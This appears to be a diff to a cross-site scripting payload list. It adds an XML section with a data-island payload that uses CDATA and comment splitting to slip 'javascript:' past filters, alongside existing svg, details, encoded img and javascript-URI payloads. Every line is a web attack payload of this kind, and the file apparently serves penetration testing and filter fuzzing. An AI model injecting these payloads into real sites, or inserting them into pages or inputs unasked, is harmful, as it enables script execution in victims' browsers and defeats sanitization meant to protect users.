@@ -8,5 +8,8 @@ a"><svg/onload=prompt(1)>
 %27"><details%20ontoggle=prompt('XSS')%20open>
 "\u003e\u003cimg src=1 onerror=alert(0)\u003e
 %26%2302java%26%23115cript:alert(document.domain)
+
+//XML
 <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
 "<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
